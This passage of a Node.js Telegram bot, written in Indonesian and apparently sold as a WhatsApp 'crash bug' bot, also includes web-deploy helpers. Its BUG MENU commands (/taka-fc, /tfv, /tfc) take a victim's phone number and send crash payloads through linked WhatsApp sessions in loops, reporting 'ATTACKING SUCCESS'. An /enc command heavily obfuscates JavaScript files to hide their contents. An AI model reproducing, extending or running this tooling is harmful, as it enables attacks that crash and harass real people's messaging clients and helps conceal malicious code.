      await bot.editMessageText(
        "📦 Mengekstrak file ZIP...",
        {
          chat_id: chatId,
          message_id: loadingMsg.message_id
        }
      );

      const unzipper = require('unzipper');
      const directory = await unzipper.Open.buffer(fileBuffer);

      for (const fileEntry of directory.files) {
        if (fileEntry.type === 'File') {
          const content = await fileEntry.buffer();
          const filePath = fileEntry.path.replace(/^\/+/, '').replace(/\\/g, '/');
          filesToUpload.push({
            file: filePath,
            data: content.toString('base64'),
            encoding: 'base64'
          });
        }
      }

      if (!filesToUpload.some(x => x.file.toLowerCase().endsWith('index.html'))) {
        await bot.editMessageText(
          '❌ File index.html tidak ditemukan dalam struktur ZIP.\n\nPastikan ZIP berisi file index.html',
          {
            chat_id: chatId,
            message_id: loadingMsg.message_id
          }
        );
        return;
      }

    } else if (file.file_name.endsWith('.html')) {
      filesToUpload.push({
        file: 'index.html',
        data: fileBuffer.toString('base64'),
        encoding: 'base64'
      });
    }

    await bot.editMessageText(
      '🚀 Melakukan deploy ke Vercel...',
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id
      }
    );

    // Deploy ke Vercel
    const headers = {
      Authorization: `Bearer ${vercelToken}`,
      'Content-Type': 'application/json'
    };

    // Buat project (jika belum ada)
    await fetch('https://api.vercel.com/v9/projects', {
      method: 'POST',
      headers,
      body: JSON.stringify({ name: formattedWebName })
    }).catch(() => {});

    // Deploy
    const deployRes = await fetch('https://api.vercel.com/v13/deployments', {
      method: 'POST',
      headers,
      body: JSON.stringify({
        name: formattedWebName,
        project: formattedWebName,
        files: filesToUpload,
        projectSettings: { framework: null }
      })
    });

    const deployData = await deployRes.json();

    if (!deployData || !deployData.url) {
      console.log('Deploy Error:', deployData);
      await bot.editMessageText(
        `❌ Gagal deploy ke Vercel:\n${JSON.stringify(deployData, null, 2)}`,
        {
          chat_id: chatId,
          message_id: loadingMsg.message_id
        }
      );
      return;
    }

    // Success message
    await bot.editMessageText(
      `✅ *Website berhasil dibuat!*\n\n🌐 *URL:* https://${formattedWebName}.vercel.app\n📁 *Project:* ${formattedWebName}\n⏱️ Deployment selesai!\n\nWebsite sudah online dan dapat diakses.`,
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
        parse_mode: "Markdown"
      }
    );

  } catch (error) {
    console.error('Error:', error);
    
    if (loadingMsg) {
      await bot.editMessageText(
        '❌ Terjadi kesalahan saat memproses request.\n\nCoba lagi beberapa saat.',
        {
          chat_id: chatId,
          message_id: loadingMsg.message_id
        }
      );
    } else {
      await bot.sendMessage(
        chatId,
        '❌ Terjadi kesalahan saat memproses request.'
      );
    }
  }
}

// TAMBAHKAN FITUR CREATEWEB3 (GitHub + Vercel)
async function handleCreateWeb3(ctx) {
  const chatId = ctx.chat.id;
  const userId = ctx.from.id.toString();
  
  // Cek permission - hanya owner dan premium
  if (!isOwner(userId) && !isPremium(userId)) {
    return bot.sendMessage(
      chatId,
      "⚠️ Akses Ditolak\nAnda tidak memiliki izin untuk menggunakan fitur ini.",
      { parse_mode: "Markdown" }
    );
  }

  const text = ctx.text;
  const args = text.split(' ').slice(1);
  const webName = args[0];

  if (!webName) {
    return bot.sendMessage(
      chatId,
      "Contoh penggunaan: `//cweb3 <namaweb>`\n\nContoh: `//cweb3 mywebsite`",
      { parse_mode: "Markdown" }
    );
  }

  // Cek apakah ada file HTML yang di-reply
  if (!ctx.reply_to_message || !ctx.reply_to_message.document) {
    return bot.sendMessage(
      chatId,
      "⚠️ Reply dokumen HTML-nya!\n\nReply file HTML lalu ketik: `//cweb3 nama-website`",
      { parse_mode: "Markdown" }
    );
  }

  const repliedMessage = ctx.reply_to_message;
  const file = repliedMessage.document;

  // Validasi tipe file harus HTML
  if (!file.mime_type.includes('html') && !file.file_name.endsWith('.html')) {
    return bot.sendMessage(
      chatId,
      "❌ File harus berupa HTML!"
    );
  }

  const formattedWebName = webName.trim().toLowerCase().replace(/\s+/g, '-');
  let loadingMsg;

  try {
    // Kirim status loading
    loadingMsg = await bot.sendMessage(
      chatId,
      "⏳ Membuat repository dan meng-upload file..."
    );

    // Download file HTML
    const fileLink = await bot.getFileLink(file.file_id);
    const fileResponse = await fetch(fileLink);
    const fileBuffer = await fileResponse.arrayBuffer();
    const fileContent = Buffer.from(fileBuffer).toString();

    // 1. Buat repository GitHub
    await bot.editMessageText(
      "🔨 Membuat repository GitHub...",
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id
      }
    );

    const createRepo = await fetch(`https://api.github.com/user/repos`, {
      method: 'POST',
      headers: {
        Authorization: `token ${githubToken}`,
        'Content-Type': 'application/json',
        'User-Agent': 'Bot'
      },
      body: JSON.stringify({
        name: formattedWebName,
        auto_init: true,
        private: false
      })
    });

    const repoResult = await createRepo.json();
    if (!repoResult?.name) {
      await bot.editMessageText(
        `❌ Gagal membuat repo: ${JSON.stringify(repoResult)}`,
        {
          chat_id: chatId,
          message_id: loadingMsg.message_id
        }
      );
      return;
    }

    // 2. Upload file index.html ke repo
    await bot.editMessageText(
      "📤 Upload file ke GitHub...",
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id
      }
    );

    const uploadFile = await fetch(`https://api.github.com/repos/${githubUsername}/${formattedWebName}/contents/index.html`, {
      method: 'PUT',
      headers: {
        Authorization: `token ${githubToken}`,
        'Content-Type': 'application/json',
        'User-Agent': 'Bot'
      },
      body: JSON.stringify({
        message: 'add index.html',
        content: Buffer.from(fileContent).toString('base64')
      })
    });

    const uploadResult = await uploadFile.json();
    if (!uploadResult?.content?.name) {
      await bot.editMessageText(
        `❌ Gagal upload file: ${JSON.stringify(uploadResult)}`,
        {
          chat_id: chatId,
          message_id: loadingMsg.message_id
        }
      );
      return;
    }

    // 3. Deploy ke Vercel
    await bot.editMessageText(
      "🚀 Deploy ke Vercel...",
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id
      }
    );

    const vercelDeploy = await fetch(`https://api.vercel.com/v13/deployments`, {
      method: 'POST',
      headers: {
        Authorization: `Bearer ${vercelToken}`,
        'Content-Type': 'application/json'
      },
      body: JSON.stringify({
        name: formattedWebName,
        files: [
          {
            file: 'index.html',
            data: Buffer.from(fileContent).toString('base64'),
            encoding: 'base64'
          }
        ],
        projectSettings: {
          framework: null
        }
      })
    });

    const vercelResult = await vercelDeploy.json();
    if (!vercelResult?.url) {
      await bot.editMessageText(
        `❌ Gagal deploy ke Vercel: ${JSON.stringify(vercelResult)}`,
        {
          chat_id: chatId,
          message_id: loadingMsg.message_id
        }
      );
      return;
    }

    // Success message
    await bot.editMessageText(
      `✅ *Sukses! Website kamu telah dibuat!*\n\n🌐 *URL:* https://${vercelResult.url}\n📁 *Repository:* https://github.com/${githubUsername}/${formattedWebName}\n\nWebsite sudah online dan dapat diakses.`,
      {
        chat_id: chatId,
        message_id: loadingMsg.message_id,
        parse_mode: "Markdown"
      }
    );

  } catch (error) {
    console.error('Error in createweb3:', error);
    
    if (loadingMsg) {
      await bot.editMessageText(
        '❌ Terjadi kesalahan saat memproses request.\n\nCoba lagi beberapa saat.',
        {
          chat_id: chatId,
          message_id: loadingMsg.message_id
        }
      );
    } else {
      await bot.sendMessage(
        chatId,
        '❌ Terjadi kesalahan saat memproses request.'
      );
    }
  }
}

function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}

function isPremium(userId) {
  try {
    const premiumUsers = loadPremiumUsers();
    return premiumUsers.includes(userId.toString());
  } catch (error) {
    console.error("Error checking premium status:", error);
    return false;
  }
}
// START
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, `Hi I Am v-rans crash Bug bot How to use?
  use the /menu command to bring up the menu`);  
});

bot.onText(/\/cekid/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const senderName = msg.from.username ? `User: @${msg.from.username}` : `User ID: ${senderId}`;
  bot.sendMessage(chatId, ` 
┏───────────────────────┓
│ Nᴀᴍᴇ : ${senderName}
│ ID usᴇʀ : ${senderId}
┗───────────────────────┛`);
});

bot.on("message", (msg) => {
  const chatId = msg.chat.id;
});

// TAMBAHKAN HANDLER UNTUK //cweb DAN //cweb3
bot.onText(/\/\/cweb/i, async (msg) => {
  await handleCreateWeb(msg);
});

bot.onText(/\/\/createweb/i, async (msg) => {
  await handleCreateWeb(msg);
});

bot.onText(/\/\/cweb3/i, async (msg) => {
  await handleCreateWeb3(msg);
});

bot.onText(/\/\/createweb3/i, async (msg) => {
  await handleCreateWeb3(msg);
});
        
bot.onText(/\/addbot (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "Markdown" }
    );
  }
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

bot.onText(/\/listbot/, async (msg) => {
  const chatId = msg.chat.id;

  // Cek apakah user adalah owner
  if (
    !isOwner(msg.from.id) 
  ) {
    return bot.sendMessage(
      chatId,
      "⚠️ *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
      { parse_mode: "HTML" }
    );
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung."
      );
    }

    let botList = "";
    let index = 1;
    for (const botNumber of sessions.keys()) {
      botList += `${index}. ${botNumber}\n`;
      index++;
    }

    bot.sendMessage(
      chatId,
      `*Daftar Bot WhatsApp yang Terhubung:*\n${botList}`,
      { parse_mode: "HTML" }
    );
  } catch (error) {
    console.error("Error in listbot:", error);
    bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menampilkan daftar bot. Silakan coba lagi."
    );
  }
});

// COMMAND BUG \\

bot.onText(/\/taka-fc(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const totalbot = sessions.size;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
╭━━━⭓「 𝐂𝐀𝐑𝐀 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍  」
║ ◇ Format : /taka-fc <nomor>
┃ ◇ Contoh: /taka-fc 628123456789
║ ◇ Note : jeda 5-10 menit  
╰━━━━━━━━━━━━━━━━━━━━━━━━⭓`,
      { parse_mode: "Markdown" }
    );
  }

  const jid = match[1];
  const formattedNumber = jid.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }
    
    
    let successCount = 0;
    let failCount = 0;
    const rans = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/bu6ldn.jpg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : taka-fc
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 2; i++) {
      await invisSqL(rans, target)
      await ransrombak(rans, target)
      await NullFc(rans, target)
    }

  } catch (error) {
    console.error("Error in taka-fc:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/tfv(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const totalbot = sessions.size;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
╭━━━⭓「 𝐂𝐀𝐑𝐀 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍  」
║ ◇ Format : /tfv <nomor>
┃ ◇ Contoh: /tfv 628123456789
║ ◇ Note : jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━━⭓`,
      { parse_mode: "Markdown" }
    );
  }

  const jid = match[1];
  const formattedNumber = jid.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }
    
    
    let successCount = 0;
    let failCount = 0;
    const rans = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/bu6ldn.jpg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : tfv
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 2; i++) {
      await invisSqL(rans, target)
      await ransrombak(rans, target)
      await NullFc(rans, target)
    }

  } catch (error) {
    console.error("Error in tfv:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

bot.onText(/\/tfc(?:\s+(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const totalbot = sessions.size;
  if (!isOwner(msg.from.id) && !isPremium(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda bukan premium user.",
      { parse_mode: "Markdown" }
    );
  }

  if (!match[1]) {
    return bot.sendMessage(
      chatId,
      `
╭━━━⭓「 𝐂𝐀𝐑𝐀 𝐏𝐄𝐍𝐆𝐆𝐔𝐍𝐀𝐀𝐍  」
║ ◇ Format : /tfc <nomor>
┃ ◇ Contoh: /tfc 628123456789
║ ◇ Note : jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━━⭓`,
      { parse_mode: "Markdown" }
    );
  }

  const jid = match[1];
  const formattedNumber = jid.replace(/[^0-9]/g, "");
  const target = `${formattedNumber}`+"@s.whatsapp.net";

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addbot"
      );
    }
    
    
    let successCount = 0;
    let failCount = 0;
    const rans = sessions.values().next().value;
    bot.sendPhoto(chatId, "https://files.catbox.moe/bu6ldn.jpg", {
    caption: `
╭━━━⭓「 𝐀𝐓𝐓𝐀𝐂𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒  」
║ ◇ 𝐓𝐘𝐏𝐄 : tfc
┃ ◇ 𝐓𝐀𝐑𝐆𝐄𝐓 : ${formattedNumber}
┃ ◇ 𝐓𝐎𝐓𝐀𝐋 = ${totalbot}
║ ◇ no spam jeda 5-10 menit
╰━━━━━━━━━━━━━━━━━━━━━━━⭓`,
    parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ 
            text: "「 𝘾𝙝𝙚𝙘𝙠 𝙏𝙖𝙧𝙜𝙚𝙩 」",
            url: `https://wa.me/${formattedNumber}`
          }],
        ],
      },
    })

    for (let i = 0; i < 2; i++) {
      await invisSqL(rans, target)
      await ransrombak(rans, target)
      await NullFc(rans, target)
    }

  } catch (error) {
    console.error("Error in tfc:", error);
    await bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat mengirim bug. Silakan coba lagi."
    );
  }
});

// BUTTONS MENU
const mainMenuButtons = {
  reply_markup: {
    inline_keyboard: [
      [{
         text: "OWNER MENU", 
         callback_data: "owner"
      },{ 
         text: "BUG MENU", 
         callback_data: "bugmenu" 
      }],
      [{ 
         text: "WEB CREATOR", 
         callback_data: "webcreator" 
      }],
      [{ 
         text: "Tanks - To", 
         callback_data: "tqto" 
      }],
      [{ 
         text: "Semua Menu", 
         callback_data: "allmenu" 
      }],
    ],
  },
};

// BUTTON BACK
const menuWithBackButton = {
  reply_markup: {
    inline_keyboard: [
      [{ 
        text: "⬅️ Back",
        callback_data: "back" 
      }],
    ],
  },
};

function checkAndGetImagePath(imageName) {
  const imagePath = path.join(
    __dirname, 
    "assets", 
    "images",
    imageName
  );
  if (!fs.existsSync(imagePath)) {
    throw new Error("File gambar tidak ditemukan");
  }
  return imagePath;
}
// CASE MENU DLL
bot.onText(/\/menu/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const waktuRunPanel = getUptime();
  try {
    const imagePath = checkAndGetImagePath("thumb.jpeg");
    await bot.sendPhoto(chatId, fs.createReadStream(imagePath), {
      caption: `\`\`\`╭━( Information Bot )
┃女 Name : T-Five
┃女 Version : 1.0.0
┃女 Developer : taka
┃女 User : ${chatId}
┃女 User ID : ${senderId}
┃女 Online : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓\`\`\``,
      parse_mode: "Markdown",
      ...mainMenuButtons,
    });
  } catch (error) {
    console.error("Error sending menu:", error);
    await bot.sendMessage(
      chatId,
      `\`\`\`
╭━( Information Bot )
┃女 Name : T-Five
┃女 Version : 1.0.0
┃女 Developer : taka
┃女 User : ${chatId}
┃女 User ID : ${senderId}
┃女 Online : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓\`\`\``,
      {
        parse_mode: "Markdown",
        ...mainMenuButtons,
      }
    );
  }
});

bot.on("callback_query", async (query) => {
  await bot.answerCallbackQuery(query.id).catch(console.error);
  const waktuRunPanel = getUptime();
  const senderId = query.from.id;
  const chatId = query.message.chat.id;
  const messageId = query.message.message_id;

  let caption;
  let buttons;

  try {
    const imagePath = checkAndGetImagePath("thumb.jpeg");
    switch (query.data) {
      case "owner":
        caption = `\`\`\`
╭━( OWNER MENU )
┃女 /addbot 62xxx 
┃女 /addprem <id>
┃女 /delprem <id>
┃女 /addowner <id>
┃女 /delowner <id>
╰━━━━━━━━━━━━━━━━━━⭓\`\`\``;
        buttons = menuWithBackButton;
        break;

       case "allmenu":
        caption = `\`\`\`
╭━( Information Bot )
┃女 Name : T-Five
┃女 Version : 1.0.0
┃女 Developer : taka
┃女 User : ${chatId}
┃女 User ID : ${senderId}
┃女 Online : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓

╭━( OWNER MENU )
┃女 /addbot 62xxx 
┃女 /addprem <id>
┃女 /delprem <id>
┃女 /addowner <id>
┃女 /delowner <id>
╰━━━━━━━━━━━━━━━━━━⭓
  
╭━( BUG MENU )
┃女 /taka-fc 62xxx 
┃女 /tfv 62xxx 
┃女 /tfc 62xxx 
╰━━━━━━━━━━━━━━━━━━⭓

╭━( WEB CREATOR )
┃女 //cweb <namaweb> (ZIP/HTML)
┃女 //createweb <namaweb> (ZIP/HTML)
┃女 //cweb3 <namaweb> (HTML only)
┃女 //createweb3 <namaweb> (HTML only)
┃女 Reply file ZIP/HTML
╰━━━━━━━━━━━━━━━━━━⭓\`\`\``;
        buttons = menuWithBackButton;
        break;

      case "bugmenu":
        caption = `\`\`\`
╭━( BUG MENU )
┃女 /taka-fc 62xxx 
┃女 /tfv 62xxx 
┃女 /tfc 62xxx 
╰━━━━━━━━━━━━━━━━━━⭓\`\`\``;
        buttons = menuWithBackButton;
        break;

      case "webcreator":
        caption = `\`\`\`
╭━( WEB CREATOR )
┃女 //cweb <namaweb> (ZIP/HTML)
┃女 //createweb <namaweb> (ZIP/HTML)
┃女 //cweb3 <namaweb> (HTML only)
┃女 //createweb3 <namaweb> (HTML only)
┃女 Reply file ZIP/HTML
╰━━━━━━━━━━━━━━━━━━⭓

Perbedaan Fitur:
• //cweb - Deploy langsung ke Vercel
  Support: ZIP (dengan index.html) & HTML

• //cweb3 - Deploy via GitHub + Vercel  
  Support: HTML file only
  Bonus: Dapat repository GitHub

Cara penggunaan:
1. Kirim file ZIP/HTML ke bot
2. Reply file tersebut dengan command
3. Bot akan deploy otomatis

Contoh:
//cweb portfolio-saya
//cweb3 landing-page\`\`\``;
        buttons = menuWithBackButton;
        break;
        
case "tqto":
        caption = `\`\`\`
      TANKS - TO
╭────────────────
│ Ranstech <Dev xandros>
│ Wolf/Gabriel <Sahabat gua>
│ Delta <Dev Delta + kawan jomok dia jir>
│ Alan <Dev Holow + kawan agak mesum>
│ Vampire <Dev Vampire + om gua>
│ Depay <Dev Nika + Partner terbaik gua>
│ Petra <Dev Infernox + cina sipit>
│ Kaizi <Dev Nara + Kawan>
│ Rapip <Dev Improve>
│ Takashi <Dev Taka>
│ Adit6core <Dev Adit + Kawan >
│ Kahfimood <Dev Kahfimoodtzy + Kang vps>
│ RizzLeons <Dev Abal Abal>
│ All pt/prib Rans
│ All Buyer Xandros
╰─────────────────\`\`\``;
        buttons = menuWithBackButton;
        break;
        
      case "back":
        caption = `\`\`\`
╭━( Information Bot )
┃女 Name : T-Five
┃女 Version : 1.0.0
┃女 Developer : taka
┃女 User : ${chatId}
┃女 User ID : ${senderId}
┃女 Online : ${waktuRunPanel}
╰━━━━━━━━━━━━━━━━━━⭓\`\`\``;
        buttons = mainMenuButtons;
        break;
        
    }

    await bot.editMessageCaption(caption, {
      chat_id: chatId,
      message_id: messageId,
      parse_mode: "Markdown",
      ...buttons,
    });
  } catch (error) {
    console.error("Error handling callback query:", error);
    await bot.sendMessage(chatId, caption, {
      parse_mode: "Markdown",
      ...buttons,
    });
  }
});

bot.onText(/\/addprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const userId = match[1].trim();

  try {
    const premiumUsers = loadPremiumUsers();

    if (premiumUsers.includes(userId)) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${userId} sudah
│ terdaftar sebagai premium
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    premiumUsers.push(userId);
    savePremiumUsers(premiumUsers);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENAMBAHKAN
│────────────────
│ ID: ${userId}
│ Status: Premium User
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding premium user:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan user premium. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delprem (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const userId = match[1].trim();

  try {
    const premiumUsers = loadPremiumUsers();
    const index = premiumUsers.indexOf(userId);

    if (index === -1) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENGHAPUS
│────────────────
│ User ${userId} tidak
│ terdaftar sebagai premium
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    premiumUsers.splice(index, 1);
    savePremiumUsers(premiumUsers);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENGHAPUS  
│────────────────
│ ID: ${userId}
│ Status: User Biasa
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing premium user:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus user premium. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/addowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const newOwnerId = match[1].trim();

  try {
    const configPath = "./config.js";
    const configContent = fs.readFileSync(configPath, "utf8");

    if (config.OWNER_ID.includes(newOwnerId)) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENAMBAHKAN    
│────────────────
│ User ${newOwnerId} sudah
│ terdaftar sebagai owner
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID.push(newOwnerId);

    const newContent = `module.exports = {
      BOT_TOKEN: "${config.BOT_TOKEN}",
      OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
    };`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENAMBAHKAN    
│────────────────
│ ID: ${newOwnerId}
│ Status: Owner Bot
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error adding owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menambahkan owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/delowner (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!isOwner(msg.from.id)) {
    return bot.sendMessage(
      chatId,
      "⚠️ akses Ditolak\nAnda tidak memiliki izin untuk menggunakan command ini.",
      {
        parse_mode: "Markdown",
      }
    );
  }

  const ownerIdToRemove = match[1].trim();

  try {
    const configPath = "./config.js";

    if (!config.OWNER_ID.includes(ownerIdToRemove)) {
      return bot.sendMessage(
        chatId,
        `
╭─────────────────
│    GAGAL MENGHAPUS    
│────────────────
│ User ${ownerIdToRemove} tidak
│ terdaftar sebagai owner
╰─────────────────`,
        {
          parse_mode: "Markdown",
        }
      );
    }

    config.OWNER_ID = config.OWNER_ID.filter((id) => id !== ownerIdToRemove);

    const newContent = `module.exports = {
      BOT_TOKEN: "${config.BOT_TOKEN}",
      OWNER_ID: ${JSON.stringify(config.OWNER_ID)},
    };`;

    fs.writeFileSync(configPath, newContent);

    await bot.sendMessage(
      chatId,
      `
╭─────────────────
│    BERHASIL MENGHAPUS    
│────────────────
│ ID: ${ownerIdToRemove}
│ Status: User Biasa
╰─────────────────`,
      {
        parse_mode: "Markdown",
      }
    );
  } catch (error) {
    console.error("Error removing owner:", error);
    await bot.sendMessage(
      chatId,
      "❌ Terjadi kesalahan saat menghapus owner. Silakan coba lagi.",
      {
        parse_mode: "Markdown",
      }
    );
  }
});

bot.onText(/\/enc/, async (msg) => {
  const chatId = msg.chat.id;
  const replyMessage = msg.reply_to_message;
  
  if (!replyMessage || !replyMessage.document || !replyMessage.document.file_name.endsWith('.js')) {
    return bot.sendMessage(chatId, '[ ! ] Reply .js');
  }

  const fileId = replyMessage.document.file_id;
  const fileName = replyMessage.document.file_name;
      
  const fileLink = await bot.getFileLink(fileId);
  const response = await axios.get(fileLink, { 
    responseType: 'arraybuffer'
  });
  
  const codeBuffer = Buffer.from(response.data);
  const tempFilePath = `./@hardenc${fileName}`;
  fs.writeFileSync(tempFilePath, codeBuffer);
  
  bot.sendMessage(chatId, "[ ! ] WAITTING FOR PROCCESS....");
  const obfuscatedCode = await JsConfuser.obfuscate(codeBuffer.toString(), {
    jid: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,
    identifierGenerator: function () {
      const originalString = "肀fantasi crash金" + "肀fantasi crash金";
        function removeUnwantedChars(input) {
          return input.replace(/[^a-zA-Z肀fantasi crash金]/g, '');
        }
        function randomString(length) {
          let result = '';
          const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
          for (let i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * characters.length));
          }
          return result;
        }
        return removeUnwantedChars(originalString) + randomString(2);
      }, 
      renameVariables: true,
      renameGlobals: true,
      stringEncoding: true,
      stringSplitting: 0.0,
      stringConcealing: true,
      stringCompression: true,
      duplicateLiteralsRemoval: 1.0,
      shuffle: { hash: 0.0, true: 0.0 },
      stack: true,
      controlFlowFlattening: 1.0,
      opaquePredicates: 0.9,
      deadCode: 0.0,
      dispatcher: true,
      rgf: false,
      calculator: true,
      hexadecimalNumbers: true,
      movedDeclarations: true,
      objectExtraction: true,
      globalConcealing: true
    });
  
    const encryptedFilePath = `./@hardenc${fileName}`;
    fs.writeFileSync(encryptedFilePath, obfuscatedCode);
      
    bot.sendDocument(chatId, encryptedFilePath, {
      caption: `[ ! ] SUCCESSFULLY ENC HARD!!`
    });
  });